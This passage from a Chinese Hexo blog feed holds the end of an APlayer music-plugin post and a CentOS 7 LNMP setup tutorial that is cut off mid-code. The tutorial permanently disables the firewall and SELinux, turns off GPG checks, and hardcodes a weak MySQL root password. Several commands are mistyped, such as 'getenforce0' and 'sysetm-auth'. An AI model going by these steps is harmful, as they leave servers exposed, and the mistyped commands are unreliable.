href="#七、添加音乐插件aplayer" class="headerlink" title="七、添加音乐插件aplayer"></a>七、添加音乐插件aplayer</h1><p>很简约可爱的一个音乐插件。</p><p><img src="https://i.loli.net/2019/08/08/kQM4uqGIgl9pSme.jpg" alt="screenshot.4.jpg"></p><p>先下载<a href="https://github.com/MoePlayer/APlayer">源码</a>，把解压后的disk文件放到<strong>\themes\next\source</strong>里。</p><p>然后在disk文件里新建music.js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">APlayer</span>(&#123;<br>    <span class="hljs-attr">container</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;aplayer&#x27;</span>), <span class="hljs-comment">//播放器容器元素</span><br>    <span class="hljs-attr">fixed</span>: <span class="hljs-literal">true</span>, <br>    <span class="hljs-attr">autoplay</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//自动播放</span><br>    <span class="hljs-comment">//theme: &#x27;#FADFA3&#x27;, //主题色</span><br>    <span class="hljs-attr">loop</span>: <span class="hljs-string">&#x27;all&#x27;</span>, <span class="hljs-comment">//音频循环播放, 可选值: &#x27;all&#x27;全部循环, &#x27;one&#x27;单曲循环, &#x27;none&#x27;不循环</span><br>    <span class="hljs-attr">order</span>: <span class="hljs-string">&#x27;list&#x27;</span>, <span class="hljs-comment">//音频循环顺序, 可选值: &#x27;list&#x27;列表循环, &#x27;random&#x27;随机循环</span><br>    <span class="hljs-attr">preload</span>: <span class="hljs-string">&#x27;auto&#x27;</span>, <span class="hljs-comment">//预加载，可选值: &#x27;none&#x27;, &#x27;metadata&#x27;, &#x27;auto&#x27;</span><br>    <span class="hljs-attr">volume</span>: <span class="hljs-number">0.7</span>, <span class="hljs-comment">//默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span><br>    <span class="hljs-attr">mutex</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器</span><br>    <span class="hljs-attr">listFolded</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//列表默认折叠</span><br>    <span class="hljs-attr">listMaxHeight</span>: <span class="hljs-number">90</span>, <span class="hljs-comment">//列表最大高度</span><br>    <span class="hljs-attr">lrcType</span>: <span class="hljs-number">3</span>, <span class="hljs-comment">//歌词传递方式</span><br>    <span class="hljs-attr">audio</span>: [ <span class="hljs-comment">//音频信息,包含以下</span><br>        &#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;STAND-ALONE&#x27;</span>, <span class="hljs-comment">//音频名称</span><br>            <span class="hljs-attr">artist</span>: <span class="hljs-string">&#x27;Aimer&#x27;</span>, <span class="hljs-comment">//音频艺术家</span><br>            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/dist/music/STAND-ALONE.mp3&#x27;</span>, <span class="hljs-comment">//音频外链</span><br>            <span class="hljs-attr">cover</span>: <span class="hljs-string">&#x27;https://p1.music.126.net/ZzYO1LkLvRZVBoCnfsYAUA==/109951164050936507.jpg?param=177y177&#x27;</span>, <span class="hljs-comment">//音频封面</span><br>            <span class="hljs-attr">lrc</span>: <span class="hljs-string">&#x27;dist/music/STAND-ALONE.lrc&#x27;</span>, <span class="hljs-comment">//音频歌词，配合上面的lrcType使用</span><br>        &#125;, <br>        &#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;This is the show&#x27;</span>, <span class="hljs-comment">//音频名称</span><br>            <span class="hljs-attr">artist</span>: <span class="hljs-string">&#x27;辻詩音&#x27;</span>, <span class="hljs-comment">//音频艺术家</span><br>            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/dist/music/This is the show.mp3&#x27;</span>, <span class="hljs-comment">//音频外链</span><br>            <span class="hljs-attr">cover</span>: <span class="hljs-string">&#x27;https://p1.music.126.net/LdYemYBR_IiERIfM3uMsEg==/109951163339791625.jpg?param=177y177&#x27;</span>, <span class="hljs-comment">//音频封面</span><br>            <span class="hljs-attr">lrc</span>: <span class="hljs-string">&#x27;dist/music/This is the show.lrc&#x27;</span>, <span class="hljs-comment">//音频歌词，配合上面的lrcType使用</span><br>        &#125;,<br>        <br>    ]<br>&#125;);<br></code></pre></td></tr></table></figure><p>我用的是吸底模式，一共有四种模式，如果想切换成别的模式可以根据<a href="https://aplayer.js.org/#/zh-Hans/?id=%E6%92%AD%E6%94%BE%E5%88%97%E8%A1%A8">官方文档</a>进行修改。</p><p>设定好了样式，就把下面的代码放入**_layout.swig<strong>的</strong>body标签**中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/dist/APlayer.min.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;aplayer&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/dist/APlayer.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/dist/music.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.simon96.online/2018/10/12/hexo-tutorial/">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></p><p><a href="https://blog.csdn.net/qq_36759224/article/details/85420403#font_colorFF0000___font_129">https://blog.csdn.net/qq_36759224/article/details/85420403#font_colorFF0000___font_129</a></p><p><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02">https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02</a></p><p><a href="https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html">https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html</a></p>]]></content>
    
    
    <categories>
      
      <category>博客相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7 lnmp环境搭建</title>
    <link href="/2019/08/06/old/centos7-lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/08/06/old/centos7-lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>由于是第一次搭建环境，踩了不少坑。中途各种error，感觉很苦手，不过学下来还是很有收获。</p><span id="more"></span><h2 id="一、LNMP"><a href="#一、LNMP" class="headerlink" title="一、LNMP"></a>一、LNMP</h2><p><strong>（centos7+nginx1.16+mysql5.7+php7）</strong></p><h3 id="1-编译环境"><a href="#1-编译环境" class="headerlink" title="1.编译环境"></a>1.编译环境</h3><h4 id="1-1关闭防火墙"><a href="#1-1关闭防火墙" class="headerlink" title="1.1关闭防火墙"></a>1.1关闭防火墙</h4><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl status firewalld  <span class="hljs-comment">#查看防火墙状态（inactive为关闭，active为开启）</span><br><span class="hljs-params">system</span>ctl stop firewalld    <span class="hljs-comment">#暂时关闭防火墙</span><br><span class="hljs-params">system</span>ctl disable firewalld <span class="hljs-comment">#永久关闭防火墙</span><br></code></pre></td></tr></table></figure><h4 id="1-2-关闭SELinux"><a href="#1-2-关闭SELinux" class="headerlink" title="1.2 关闭SELinux"></a>1.2 关闭SELinux</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">getenforce</span>  <span class="hljs-comment">#查看SElinux状态</span><br>getenforce0 <span class="hljs-comment">#暂时关闭</span><br></code></pre></td></tr></table></figure><!-- more --><p>*永久关闭，修改&#x2F;etc&#x2F;selinux&#x2F;config ,将SELINUX&#x3D;enforcing 为 SELINUX&#x3D;disabled。</p><p><img src="https://i.loli.net/2019/08/07/1RSgNDI7OMCHXiy.png" alt="1564765401246.png"></p><h3 id="2-安装Nginx"><a href="#2-安装Nginx" class="headerlink" title="2.安装Nginx"></a>2.安装Nginx</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nginx<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/5iJWcXeGYBFzdua.png" alt="1564765485371.png"></p><p>发现无法直接安装。因为yum源中没有nginx，所以我们要添加一个nginx.repo。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/yum</span>.repos.d/nginx.repo<br></code></pre></td></tr></table></figure><p>源文件内容:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[nginx]</span><br><span class="hljs-attr">name</span>=nginx repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>查看nginx是否配置成功：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">yum <span class="hljs-type">list</span> nginx<br>yum <span class="hljs-type">list</span> |grep nginx<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/ni3MqyfzS1IjphR.png" alt="1564765773786.png"></p><p>安装nginx：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nginx<br>nginx <span class="hljs-comment">#启动Nignx</span><br></code></pre></td></tr></table></figure><p>查询是否安装成功：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Nginx</span> -v <span class="hljs-comment">#查看版本号</span><br>curl <span class="hljs-number">127.0.0.1</span>  <span class="hljs-comment">#用curl查看是否安装成功，若成功，输出html反馈</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/dFwSXlgnzbBkrUj.png" alt="1564766054290.png"></p><h3 id="3-安装mysql"><a href="#3-安装mysql" class="headerlink" title="3.安装mysql"></a>3.安装mysql</h3><p>更新yum源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Uvh http:<span class="hljs-regexp">//</span>dev.mysql.com<span class="hljs-regexp">/get/my</span>sql57-community-release-el7-<span class="hljs-number">9</span>.noarch.rpm<br></code></pre></td></tr></table></figure><p>查看5.7版本是否启用：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">yum repolist <span class="hljs-keyword">all</span> | <span class="hljs-keyword">grep</span> mysql<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/TN3h4i7pPUnrmEy.png" alt="1564766177432.png"></p><p>此处是已启用，若未启用则可修改源文件（vim &#x2F;etc&#x2F;yum.repos.d&#x2F;mysql-community.repo）将5.7版的enable设为1，其他的版本设为0.</p><p>查看可用的版本（有5.7即可安装）：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">yum repolist enabled <span class="hljs-string">| grep mysql</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/irOZo1XMCpnxWuN.png" alt="1.png"></p><p>安装（需要漫长的等待）：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum -y install mysql-community-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/PFHsxiu2y5QgXJY.png" alt="1564766424952.png"></p><p>完成！</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">mysql -V<span class="hljs-comment">#查看版本号，有返回结果则表示安装成功</span><br>service mysqld <span class="hljs-literal">start</span><span class="hljs-comment">#启动mysql</span><br>service mysqld status<span class="hljs-comment">#查看启动状态</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/Qw6ARd9EIfvnKye.png" alt="1564766647203.png"></p><h3 id="4-安装php"><a href="#4-安装php" class="headerlink" title="4.安装php"></a>4.安装php</h3><p>更新yum源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Uvh https:<span class="hljs-regexp">//</span>dl.fedoraproject.org<span class="hljs-regexp">/pub/</span>epel/epel-release-latest-<span class="hljs-number">7</span>.noarch.rpm<br>rpm -Uvh https:<span class="hljs-regexp">//mi</span>rror.webtatic.com<span class="hljs-regexp">/yum/</span>el7/webtatic-release.rpm<br></code></pre></td></tr></table></figure><p>安装php：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64<br></code></pre></td></tr></table></figure><p>安装php-fpm：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">yum install php70w-fpm php70w-opcache<br></code></pre></td></tr></table></figure><p>启动php-fpm：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> php-fpm<br></code></pre></td></tr></table></figure><p>查看是否安装成功：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">php-v</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/p4ix8JohtWcsebF.png" alt="1564766881529.png"></p><h3 id="5-配置"><a href="#5-配置" class="headerlink" title="5.配置"></a>5.配置</h3><h4 id="5-1-配置Nginx"><a href="#5-1-配置Nginx" class="headerlink" title="5.1 配置Nginx"></a>5.1 配置Nginx</h4><p>备份文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/nginx.conf /</span>etc<span class="hljs-regexp">/nginx/</span>nginx.conf.bak<br></code></pre></td></tr></table></figure><p>打开配置文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br></code></pre></td></tr></table></figure><p>修改配置（如下）：</p><p><img src="https://i.loli.net/2019/08/07/d8vWQjwpFBsPZzX.png" alt="1564766989315.png"></p><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service nginx restart</span><br></code></pre></td></tr></table></figure><h4 id="5-2-配置mysql"><a href="#5-2-配置mysql" class="headerlink" title="5.2 配置mysql"></a>5.2 配置mysql</h4><p>启动mysql服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> mysqld<br></code></pre></td></tr></table></figure><p>设置mysql开机自启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> mysqld<br></code></pre></td></tr></table></figure><h4 id="5-3-配置php"><a href="#5-3-配置php" class="headerlink" title="5.3 配置php"></a>5.3 配置php</h4><p>启动php-fpm：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> php-fpm<br></code></pre></td></tr></table></figure><p>设置自启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> php-fpm<br></code></pre></td></tr></table></figure><h4 id="5-4-测试"><a href="#5-4-测试" class="headerlink" title="5.4 测试"></a>5.4 测试</h4><p>在&#x2F;usr&#x2F;share&#x2F;php目录下新建phpinfo.php文件，用于展示phpinfo信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/php/</span>phpinfo.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/3cjUBbn4MTLluIV.png" alt="1564767534260.png"></p><p>新建mysql.php文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/php/my</span>sql.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);  <span class="hljs-comment">#123456为mysql的密码</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;mysql success!!&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/SmFZie9cB8bCQ65.png" alt="1564772802636.png"></p><h3 id="6-简单加固"><a href="#6-简单加固" class="headerlink" title="6.简单加固"></a>6.简单加固</h3><h4 id="6-1-linux用户"><a href="#6-1-linux用户" class="headerlink" title="6.1 linux用户"></a>6.1 linux用户</h4><h5 id="（1）设定密码策略"><a href="#（1）设定密码策略" class="headerlink" title="（1）设定密码策略"></a>（1）设定密码策略</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>login.defs<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/sfuUgPtGh9XVBJI.png" alt="1564774021401.png"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">PASS_MAX_DAYS    <span class="hljs-number"> 90 </span>              <span class="hljs-comment">#密码最长有效期</span><br>PASS_MIN_DAYS    <span class="hljs-number"> 10 </span>              <span class="hljs-comment">#密码修改之间最小的天数</span><br>PASS_MIN_LEN     <span class="hljs-number"> 8 </span>               <span class="hljs-comment">#密码长度</span><br>PASS_WARN_AGE    <span class="hljs-number"> 7 </span>               <span class="hljs-comment">#口令失效前多少天开始通知用户修改密码</span><br></code></pre></td></tr></table></figure><h5 id="（2）对用户密码强度进行设定"><a href="#（2）对用户密码强度进行设定" class="headerlink" title="（2）对用户密码强度进行设定"></a>（2）对用户密码强度进行设定</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>pam.d/sysetm-auth <br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/Fx5gQ2VCYDJP3iO.png" alt="1564774418247.png"></p><p>修改为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">password    requisite     pam_pwquality.so try_first_pass local_users_only <span class="hljs-attribute">retry</span>=3 authtok_type=  <span class="hljs-attribute">difok</span>=1 <span class="hljs-attribute">minlen</span>=8 <span class="hljs-attribute">ucredit</span>=-1 <span class="hljs-attribute">lcredit</span>=-1 <span class="hljs-attribute">dcredit</span>=-1<br></code></pre></td></tr></table></figure><p>difok&#x3D; ：此选项用来定义新密码中必须要有几个字符和旧密码不同<br>minlen&#x3D;：此选项用来设置新密码的最小长度<br>ucredit&#x3D; ：此选项用来设定新密码中可以包含的大写字母的最大数目。-1 至少一个<br>lcredit&#x3D;：此选项用来设定新密码中可以包含的小写字母的最大数目<br>dcredit&#x3D;：此选项用来设定新密码中可以包含的数字的最大数目 </p><h5 id="（3）对用户的登录次数进行限制"><a href="#（3）对用户的登录次数进行限制" class="headerlink" title="（3）对用户的登录次数进行限制"></a>（3）对用户的登录次数进行限制</h5><p>有些软件可以通过暴力破解的方法，反复的尝试登录已破解密码。所以要对用户的登录次数进行限制。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>pam.d/sshd<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/MZB4sQ6rUjiAwlm.png" alt="1564775069881.png"></p><p>在#%PAM-2.0下添加：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">auth required pam_tally2.so <span class="hljs-attribute">deny</span>=3 <span class="hljs-attribute">unlock_time</span>=150 even_deny_root root_unlock_time300<br></code></pre></td></tr></table></figure><p>意为，用户密码错误3次，锁定150秒。root用户密码错误3次，锁定300秒。</p><h4 id="6-2-mysql加固"><a href="#6-2-mysql加固" class="headerlink" title="6.2 mysql加固"></a>6.2 mysql加固</h4><p>查看文件，获取root用户的初始密码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">grep <span class="hljs-string">&#x27;temporary password&#x27;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/mysqld.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>配置mysql的安全性：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql_secure_installation</span><br></code></pre></td></tr></table></figure><p>重置密码（输入刚才获取的root初始密码）：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#修改root密码（长度为8至30个字符，必须同时包含大小写英文字母、数字和特殊符号）</span><br>Change the password <span class="hljs-keyword">for</span> root ? ((Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y <br><br><span class="hljs-comment">#删除匿名用户</span><br><span class="hljs-built_in">Remove</span> anonymous users? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) :  y<br><br><span class="hljs-comment">#禁止root远程登录</span><br>Disallow root login remotely? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y<br><br><span class="hljs-comment">#是否删除test库和对它的访问权限，输入</span><br><span class="hljs-built_in">Remove</span> test database <span class="hljs-keyword">and</span> access <span class="hljs-keyword">to</span> it? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y <br><br><span class="hljs-comment">#是否重新加载授权表</span><br>Reload privilege tables now? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) :  y<br></code></pre></td></tr></table></figure><h3 id="7-遇到的问题以及解决方案"><a href="#7-遇到的问题以及解决方案" class="headerlink" title="7.遇到的问题以及解决方案"></a>7.遇到的问题以及解决方案</h3><h4 id="7-1-网络不通"><a href="#7-1-网络不通" class="headerlink" title="7.1 网络不通"></a>7.1 网络不通</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/sysconfig/network-scripts<br><span class="hljs-built_in">ls</span><br>vim ifcfg-ens33<span class="hljs-comment">#也有可能会是别的名字，根据实际情况改</span><br></code></pre></td></tr></table></figure><p>修改<strong>ONBOOT&#x3D;yes</strong></p><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service network restart</span><br></code></pre></td></tr></table></figure><h4 id="7-2-yum-pid-已被锁定"><a href="#7-2-yum-pid-已被锁定" class="headerlink" title="7.2 yum.pid 已被锁定"></a>7.2 yum.pid 已被锁定</h4><p><img src="https://i.loli.net/2019/08/07/IQSZF4JkMd3v15b.png" alt="1564767799373.png"></p><p>解决方法：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">rm</span> -rf /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/yum.pid<br></code></pre></td></tr></table></figure><h4 id="7-3-80端口被占用，nginx无法启动"><a href="#7-3-80端口被占用，nginx无法启动" class="headerlink" title="7.3 80端口被占用，nginx无法启动"></a>7.3 80端口被占用，nginx无法启动</h4><p><img src="https://i.loli.net/2019/08/07/lhc1OpSiIkNmL3n.png" alt="1564769528812.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ltunp<span class="hljs-comment">#查看端口</span><br>lsof -i:<span class="hljs-number">80</span><span class="hljs-comment">#查看80端口</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/WDu8cNhQaz3OjpE.png" alt="1564769484707.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 